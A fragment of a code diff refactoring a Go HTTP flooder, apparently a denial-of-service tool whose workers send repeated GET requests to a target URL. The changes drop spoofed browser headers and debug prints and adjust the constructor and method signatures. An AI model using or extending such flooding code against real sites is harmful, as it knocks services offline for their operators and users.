@@ -13,17 +13,11 @@ import (
 	"time"
 )
 
-func NewFlooder(url string, workerAmount uint16, duration uint32) *flooder {
+func NewFlooder(url string, workerAmount uint16, duration uint32) Flooder {
 	ddos := &flooder{
 		url: url,
 		header: []string{
 			"Accept:*/*",
-			"Accept-Encoding:*",
-			"Accept-Language:*",
-			"Accept-Charset:*",
-			"Connection:Keep-Alive",
-			"Cache-Control:max-age=0",
-			"User-Agent:Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36",
 		},
 		workerAmount: workerAmount,
 		client:       http.DefaultClient,
@@ -82,16 +76,13 @@ func (f *flooder) Flood() {
 
 	select {
 	case <-f.timer.C:
-		fmt.Println("saiu")
 		f.Stop()
-		fmt.Println("saiu")
-
 	}
 
 	f.timer.Stop()
 }
 
-func (f flooder) configRequest() *http.Request {
+func (f *flooder) configRequest() *http.Request {
 	defaultRequest, err := http.NewRequest(http.MethodGet, f.url, nil)
 	if err != nil {
 		log.Fatal(err)
@@ -117,7 +108,6 @@ func (f *flooder) flood(request *http.Request) {
 
 			resp, err := f.client.Do(request)
 			if err == nil {
-				fmt.Println("entrou")
 				_, copyErr := io.Copy(io.Discard, resp.Body)
 				closeErr := resp.Body.Close()
 				if copyErr != nil || closeErr != nil {
